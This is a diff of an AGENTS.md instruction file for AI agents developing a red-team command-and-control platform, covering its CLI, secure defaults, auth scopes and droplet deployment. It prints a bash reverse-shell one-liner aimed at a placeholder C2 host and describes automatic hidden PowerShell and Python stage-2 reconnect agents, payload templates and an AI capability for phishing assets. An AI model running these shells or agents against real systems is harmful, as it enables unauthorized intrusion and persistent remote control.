@@ -1,204 +1,239 @@
-# AGENTS.md — Instructions for AI Agents Working on SquidSeC2
+# AGENTS.md — Instructions for AI Agents Working on SquidC5
 
-## Project
+## Classification & Mission
 
-SquidSeC2 is a lightweight, security-first, AI-native C2 for **authorized** red team / pen-test use only.
+**SquidC5 is a military-grade, security-first, AI-native Command & Control platform under active development** for **authorized** red team, penetration testing, and defensive security operations only.
+
+Treat every change as if the system will be deployed in high-threat environments:
+
+- Prefer **secure defaults** over convenience
+- Minimize attack surface and fingerprinting
+- Never weaken auth, AI sandboxing, audit, or allow-lists without explicit human design review
+- Assume hostile network exposure (internet-facing listeners, scanners, credential stuffing)
+
+Unauthorized access assistance is out of scope. Do not help with illegal use.
+
+## Project Stack
 
 Primary language: Python 3.11+ · FastAPI · SQLite · Docker-first  
-Operator CLI: `ss2` (also `squidsec2-cli`)
+Operator CLI: `sc5` (also `squidc5-cli`)  
+Ops UI: `/ops` (admin UI loaded only after server-side admin token check)
 
 ## Non-Negotiable Security Rules
 
-1. **External AI restriction**: MCP tools must remain allow-listed per token. Do not add open-ended autonomous agent loops for external models.
-2. **Admin AI shielding**: Never feed raw session output into LLM prompts without `sanitize_untrusted()`. Keep capabilities allow-listed.
-3. **Determinism preference**: Prefer templates, fixed prompts, and single-step tools over free-form agentic planning.
-4. **Audit everything**: Operator, MCP, and Admin AI actions go through the policy engine / audit trail.
-5. **No secrets in git**: Tokens, API keys, `data/` contents, `admin_token.txt`, and `~/.config/squidsec2/config.json` stay out of the repository.
-6. **Port flexibility**: Never hard-require ports 80 or 443 for listeners — but operators *may* use them.
-7. **Authorized use only**: Do not help with unauthorized access.
+1. **Secure by default**: New installs must ship hardened (no public docs/OpenAPI, no wildcard CORS, MCP off until enabled, exec probe on, false-shell filter on).
+2. **External AI restriction**: MCP tools must remain allow-listed per token. No open-ended autonomous agent loops for external models.
+3. **Admin AI shielding**: Never feed raw session output into LLM prompts without `sanitize_untrusted()`. Keep capabilities allow-listed. Prefer offline/deterministic fallbacks when no LLM is configured.
+4. **Determinism preference**: Templates, fixed prompts, single-step tools over free-form agentic planning.
+5. **Audit everything**: Operator, MCP, Admin AI, feature toggles, and admin UI loads go through the policy engine / audit trail.
+6. **No secrets in git**: Tokens, API keys, `data/`, `admin_token.txt`, `~/.config/squidc5/config.json` stay out of the repository.
+7. **Port flexibility**: Never hard-require ports 80 or 443 — operators *may* use them.
+8. **Admin UI isolation**: Admin-only HTML/JS must be served only after server validates an **admin** token (`/api/v1/ops/admin.js`). Non-admin clients must never receive admin control code.
+9. **Public docs locked off**: `/docs`, `/redoc`, `/openapi.json` stay disabled. Feature flag `public_docs` is hard-forced `false`.
+10. **Authorized use only**.
+
+## Hardened Defaults (do not casually reverse)
+
+| Control | Default |
+|---------|---------|
+| Public Swagger / OpenAPI | **OFF** (hard-locked) |
+| CORS | **empty** (no `*`) |
+| MCP external tools | **OFF** until settings/feature enable |
+| Shell exec probe | **ON** |
+| False-shell filter | **ON** |
+| Auto stage-2 stabilize | **ON** |
+| Health details | **minimal** (`{"status":"ok"}`) |
+| Security headers | **ON** (nosniff, DENY frame, CSP, no-store) |
+| Admin ops UI | **server-gated** by admin scope |
+
+When adding features: **deny by default**, enable via admin feature flags or env after review.
 
 ## Architecture Map
 
 ```
-src/squidsec2/
-  main.py           # FastAPI app + lifespan
-  config.py         # Settings (SQUIDSEC2_* env)
-  cli.py            # Operator CLI (ss2)
+src/squidc5/
+  main.py           # FastAPI app + lifespan + security headers (no public docs)
+  config.py         # Settings (SQUIDC5_* env) — secure defaults
+  features.py       # Runtime feature flags (admin-toggleable; public_docs locked)
+  cli.py            # Operator CLI (sc5)
   db/store.py       # SQLite schema + access
   auth/tokens.py    # Scoped tokens
   policy/engine.py  # Allow/deny, risk, HITL
-  sessions/         # Beacon & shell sessions
-  listeners/        # http/tcp/reverse_shell
+  sessions/         # Beacon & shell sessions (orphan reap + verified shells)
+  listeners/        # http/tcp/reverse_shell + stage-2 + exec probe
+  shells/           # classify (false shells) + stabilize (stage-2)
   tasking/          # Structured tasks
   payloads/         # Deterministic templates
   mcp/server.py     # Restricted external AI tools
-  ai/admin_ai.py    # Sandboxed internal AI
-  api/routes.py     # REST API
+  ai/admin_ai.py    # Sandboxed internal AI (BYO LLM, e.g. xAI Grok)
+  api/routes.py     # REST API + /ops/admin.js gate + /features
   metrics/          # Counters + SSE events
   audit/            # Audit facade
+web/
+  phone-dashboard.html   # Public ops shell (no admin code)
+  ops-admin.js           # Admin-only module (served after admin auth)
 ```
 
-## Operator CLI (`ss2`) — Agent Knowledge
+## Operator CLI (`sc5`) — Agent Knowledge
 
 Entry points (after `pip install -e .`):
 
-- `ss2`
-- `squidsec2-cli`
+- `sc5`
+- `squidc5-cli`
 
 Config file (local only, never commit):
 
-- Path: `~/.config/squidsec2/config.json`
+- Path: `~/.config/squidc5/config.json`
 - Keys: `url`, `token`
-- Env overrides: `SQUIDSEC2_URL` / `SS2_URL`, `SQUIDSEC2_TOKEN` / `SS2_TOKEN`
+- Env overrides: `SQUIDC5_URL` / `SC5_URL`, `SQUIDC5_TOKEN` / `SC5_TOKEN`
 - Global flags: `--url`, `--token`, `--timeout`
 
 ### Full command surface
 
 ```
-ss2 login --url <base> --token <ss2_...>
-ss2 config [--show-token]
-ss2 health | whoami | metrics | audit [--limit N] | events | repl
+sc5 login --url <base> --token <sc5_...>
+sc5 config [--show-token]
+sc5 health | whoami | metrics | audit [--limit N] | events | repl
 
-ss2 sessions list [--status active|closed]
-ss2 sessions get <id>
-ss2 sessions close <id>
+sc5 sessions list [--status active|closed] [--all] [--shells] [--include-dead] [--ids]
+sc5 sessions get <id>
+sc5 sessions close <id>
+sc5 sessions reap [--no-probe]
 
-ss2 tasks list [--session <id>]
-ss2 tasks get <id>
-ss2 tasks create <session_id> "<command>" [--args-json '{}'] [--hitl]
+sc5 tasks list [--session <id>]
+sc5 tasks get <id>
+sc5 tasks create <session_id> "<command>" [--args-json '{}'] [--hitl]
 
-ss2 listeners list
-ss2 listeners create <name> <port> [--kind http|tcp|reverse_shell] [--host 0.0.0.0]
-ss2 listeners start|stop|delete <id>
+sc5 listeners list
+sc5 listeners create <name> <port> [--kind http|tcp|reverse_shell] [--host 0.0.0.0]
+sc5 listeners start|stop|delete <id>
 
-ss2 payloads templates
-ss2 payloads generate <template> <host> <port> [--interval 5] [--raw]
+sc5 payloads templates
+sc5 payloads generate <template> <host> <port> [--interval 5] [--raw]
 # templates: http_beacon_python | http_beacon_bash | reverse_shell_bash | reverse_shell_python
 
-ss2 shell <session_id> "<command>" [--hitl]
+sc5 shell <session_id> <command...> [--wait N] [--json]
+sc5 shell all <command...>          # broadcast to verified shells only
+sc5 shell --all <command...>
+sc5 output <session_id>
 
-ss2 tokens list
-ss2 tokens create <name> --scopes "a,b,c" [--mcp-tools "t1,t2"]
-ss2 tokens revoke <id>
+sc5 tokens list
+sc5 tokens create <name> --scopes "a,b,c" [--mcp-tools "t1,t2"]
+sc5 tokens revoke <id>
 
-ss2 ai <capability> [--data "..."] [--llm <id>]
+sc5 ai <capability> [--data "..."] [--llm <id>]
 # capabilities: payload_template | phishing_asset | doc_generate | shell_classify | recon_assist
 
-ss2 llm list
-ss2 llm add <name> <model> [--provider openai] [--base-url URL] [--api-key KEY]
+sc5 llm list
+sc5 llm add <name> <model> [--provider openai|xai] [--base-url URL] [--api-key KEY]
 
-ss2 mcp tools
-ss2 mcp call <name> [--args-json '{}']
+sc5 mcp tools
+sc5 mcp call <name> [--args-json '{}']
 
-ss2 policy get
-ss2 policy set --json '...' | --file rules.json
+sc5 policy get
+sc5 policy set --json '...' | --file rules.json
 ```
 
-### REPL shortcuts (`ss2 repl`)
+### Sessions defaults
 
-`sessions`, `session <id>`, `tasks`, `task <session> <cmd>`, `listeners`,  
-`listen <name> <kind> <port>`, `start|stop <listener_id>`,  
-`payload <tpl> <host> <port>`, `metrics`, `audit`, `health`, `whoami`,  
-`ai <capability> [data]`, `help`, `quit`
+- `sc5 sessions list` → **active + live + verified reverse shells** (and active beacons when not `--shells`)
+- Dead / echo-only shells are reaped (TCP gone or fail exec probe)
+- Prefer `verified: true` before operator shell interaction
 
 ### Reverse-shell operator flow
 
-1. `ss2 listeners create rev <port> --kind reverse_shell`
-2. `ss2 listeners start <id>` — must show `running`
+1. `sc5 listeners create rev <port> --kind reverse_shell`
+2. `sc5 listeners start <id>` — must show `running`
 3. On authorized target: `bash -i >& /dev/tcp/<C2_HOST>/<port> 0>&1`
-4. `ss2 sessions list` → find `kind: reverse_shell`
-5. `ss2 shell <session_id> "whoami"`
-6. Optional: `ss2 events` for `shell.connected` / `shell.output`
+4. `sc5 sessions list --shells` → find `kind: reverse_shell` with `verified: true`
+5. `sc5 shell <session_id> "whoami"` — prints remote output
+6. Optional: `sc5 events` for `shell.connected` / `shell.output` / `shell.verified` / `session.rejected`
+
+### Auto-stabilize + false-shell filter
+
+On capture, the server:
+
+1. **Classifies** inbound bytes (`shells/classify.py`) — drops TLS ClientHello, HTTP probes, binary noise (common on port 443). Rejected sessions are **deleted** (event: `session.rejected` / `shell.false_positive`).
+2. **Probes OS** then injects stage-2:
+   - **Linux** → background reconnecting Python line-executor (`SC5_STABLE_LINUX`, supports `SC5_PING`)
+   - **Windows** → hidden PowerShell reconnect agent (`SC5_STABLE_WIN`)
+3. Stage-2 agents reconnect to `SQUIDC5_PUBLIC_HOST:<listener_port>` and are **not** re-staged (banner skip).
+4. **Exec probe** must pass or session is dropped (no more “live but mute” shells).
+5. TCP keepalive enabled; idle read timeouts no longer fake liveness.
+
+Config: `SQUIDC5_SHELL_AUTO_STABILIZE`, `SQUIDC5_PUBLIC_HOST`, `SQUIDC5_SHELL_STABILIZE_DELAY_SEC`, `SQUIDC5_SHELL_PROBE_WAIT_SEC`.
 
 Beacon flow:
 
 1. Generate HTTP beacon payload pointing at `http://HOST:8443/api/v1/implant/beacon`
 2. Run payload on authorized target
-3. `ss2 sessions list` → `kind: beacon`
-4. `ss2 tasks create <session_id> "id"` then re-check `ss2 tasks get <task_id>`
+3. `sc5 sessions list` → `kind: beacon`
+4. `sc5 tasks create <session_id> "id"` then re-check `sc5 tasks get <task_id>`
+
+## Dual AI Architecture
+
+### External AI (MCP)
+
+- Scoped tokens + per-token tool allow-list
+- Deterministic single-tool preference; chain length limited by policy
+- Feature flag / settings: MCP **off by default**
+
+### Server-side Admin AI
+
+- BYO LLM (OpenAI-compatible, including xAI Grok at `https://api.x.ai/v1`)
+- Capabilities allow-list only
+- `sanitize_untrusted` on untrusted input
+- Offline fallback if no LLM configured
+- Status: `GET /api/v1/ai/status` (+ `?debug=true`) — **never returns API keys**
 
 ## Deployment Knowledge (Docker)
 
 ### Critical: listener ports vs Docker networking
 
-Listeners bind **inside the process**. With default bridge networking, only ports listed in `docker-compose.yml` `ports:` reach the host.
-
 **Current compose uses `network_mode: host`** so reverse-shell/TCP listeners bind real host ports without republishing.
 
-If someone switches back to bridge mode:
-
-- API only: `8443:8443`
-- Every reverse-shell/TCP port must be added under `ports:` and opened in UFW
+If someone switches back to bridge mode, every reverse-shell/TCP port must be published and opened in UFW.
 
 ### Privileged ports (<1024)
 
-Container runs as non-root (`squidsec2` uid 10001). Binding 443 fails with permission denied unless the host allows unprivileged low ports:
+Container runs as non-root. Binding 443 needs:
 
 ```bash
-# on droplet/host
 sysctl -w net.ipv4.ip_unprivileged_port_start=0
-echo "net.ipv4.ip_unprivileged_port_start=0" > /etc/sysctl.d/99-squidsec2.conf
-```
-
-### Firewall (UFW)
-
-Open whatever listener ports operators use, plus API:
-
-```bash
-ufw allow OpenSSH
-ufw allow 8443/tcp
-ufw allow 443/tcp    # if using reverse shell on 443
-ufw allow 4444/tcp   # optional high port
+echo "net.ipv4.ip_unprivileged_port_start=0" > /etc/sysctl.d/99-squidc5.conf
 ```
 
 ### Admin token bootstrap
 
-On first start, if no admin token exists:
-
-- Generated once
-- Written to `$SQUIDSEC2_DATA_DIR/admin_token.txt` (Docker: `/data/admin_token.txt`)
-- **Never commit this file**
-
-Retrieve on droplet:
+On first start: written once to `$SQUIDC5_DATA_DIR/admin_token.txt` — **never commit**.
 
 ```bash
-ssh -i <key> root@<droplet> 'docker exec squidsec2 cat /data/admin_token.txt'
+docker exec squidc5 cat /data/admin_token.txt
 ```
 
 ### Deploy / update droplet
 
 ```bash
-# from repo root (example)
-rsync -az -e "ssh -i ~/.ssh/ocs_prod_deploy" \
+rsync -az -e "ssh -i <key>" \
   --exclude '.venv' --exclude 'data' --exclude '.git' \
-  --exclude '__pycache__' --exclude '.pytest_cache' \
-  ./ root@<droplet>:/opt/squidsec2/
-ssh -i ~/.ssh/ocs_prod_deploy root@<droplet> \
-  'cd /opt/squidsec2 && docker compose up -d --build --force-recreate'
+  ./ root@<droplet>:/opt/squidc5/
+ssh -i <key> root@<droplet> \
+  'cd /opt/squidc5 && docker compose up -d --build --force-recreate'
 ```
 
 Also: `scripts/deploy_droplet.sh <ip>`
-
-### Lab deployment reference (non-secret)
-
-- DigitalOcean droplet name pattern: `squidsec2-test`
-- Cheap size used: `s-1vcpu-1gb` (~$6/mo)
-- App path on host: `/opt/squidsec2`
-- API: `http://<droplet-ip>:8443`
-- Docs: `http://<droplet-ip>:8443/docs`
-- Health: `GET /api/v1/health`
-- MCP: `/mcp/tools`, `/mcp/call`
 
 **Do not store live tokens, SSH private keys, or API keys in this file.**
 
 ## Auth Model (quick)
 
-- Tokens: `ss2_<urlsafe>`
+- Tokens: `sc5_<urlsafe>`
 - Header: `Authorization: Bearer <token>` or `X-API-Token: <token>`
 - Scopes: `admin`, `sessions:read|write`, `tasks:read|write`, `listeners:read|write`,  
   `payloads:generate`, `metrics:read`, `audit:read`, `shell:interact`, `ai:use`,  
   `mcp:connect`, `tokens:manage`, `llm:manage`, `policy:manage`, …
-- External AI: requires `mcp:connect` + per-token `mcp_tools` allow-list
+- External AI: `mcp:connect` + per-token `mcp_tools` allow-list
+- Feature toggles: `GET/PUT /api/v1/features` (admin)
 
 ## Dev Commands
 
@@ -208,27 +243,26 @@ pip install -r requirements-dev.txt
 pip install -e .
 pytest -q
 ruff check src tests
-uvicorn squidsec2.main:create_app --factory --host 0.0.0.0 --port 8443
-ss2 login --url http://127.0.0.1:8443 --token "$(cat data/admin_token.txt)"
+uvicorn squidc5.main:create_app --factory --host 0.0.0.0 --port 8443
+sc5 login --url http://127.0.0.1:8443 --token "$(cat data/admin_token.txt)"
 ```
 
 Docker:
 
 ```bash
 docker compose up --build -d
-docker exec squidsec2 cat /data/admin_token.txt
+docker exec squidc5 cat /data/admin_token.txt
 ```
 
 ## Required Agent / Project Memory Files
 
-Keep these present and accurate:
-
 | File | Purpose |
 |------|---------|
 | `AGENTS.md` | **This file** — primary agent operating memory |
-| `docs/squidsec2-vision.md` | Full product vision / security architecture |
-| `docs/operator-runbook.md` | Human + agent operator procedures |
-| `docs/deployment.md` | Docker / DO droplet deployment notes |
+| `CLAUDE.md` | Pointer to AGENTS + docs |
+| `docs/squidc5-vision.md` | Full product vision / security architecture |
+| `docs/operator-runbook.md` | Operator procedures |
+| `docs/deployment.md` | Docker / droplet deployment |
 | `README.md` | Public-facing quickstart |
 | `SECURITY.md` | Disclosure policy |
 | `.gitignore` | Blocks secrets, data, local config |
@@ -237,19 +271,22 @@ Keep these present and accurate:
 ## When Changing Code
 
 - Keep changes small and auditable
-- Add/adjust pytest coverage for auth, policy, MCP allow-lists, AI sanitization, CLI if behavior changes
-- Update `docs/squidsec2-vision.md` if behavior/spec changes
-- Update this `AGENTS.md` when CLI surface, deploy model, or security boundaries change
-- Keep README accurate
-- Do not weaken MCP tool restrictions or Admin AI sandbox without explicit human design review
+- **Preserve secure-by-default posture** — new endpoints require auth/scopes; no public API maps
+- Add/adjust pytest coverage for auth, policy, MCP allow-lists, AI sanitization, CLI, feature flags
+- Update `docs/squidc5-vision.md` if behavior/spec changes
+- Update this `AGENTS.md` when CLI surface, deploy model, security boundaries, or defaults change
+- Do not weaken MCP tool restrictions, Admin AI sandbox, admin UI gate, or unlock `public_docs`
 - Never commit tokens, keys, or `data/` DB files
 
 ## Testing Focus
 
 - Token scope enforcement
+- Admin UI 403 for non-admin tokens
 - MCP tool allow-list denial paths
 - Policy HITL / deny thresholds
 - `sanitize_untrusted` injection filtering
+- Feature flag denial paths
 - Listener port bind (non-privileged ports; document privileged-port host sysctl)
 - Implant beacon task poll/complete cycle
+- Shell exec probe drops echo-only zombies
 - CLI login + basic authenticated calls (no live secrets in tests)
